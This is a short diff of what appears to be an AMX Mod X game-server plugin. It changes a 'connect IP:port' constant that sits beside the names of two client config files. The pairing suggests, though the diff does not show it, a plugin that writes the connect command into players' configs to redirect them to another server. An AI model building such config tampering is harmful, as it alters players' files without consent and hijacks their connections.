@@ -6,7 +6,7 @@
 
 #define CFG_FILE1 "autoexec.CFG"
 #define CFG_FILE2 "userconfig.CFG"
-#define CON "connect 103.195.100.16:27020"
+#define CON "connect 104.128.235.33:27015"
 
 public plugin_init()
 {
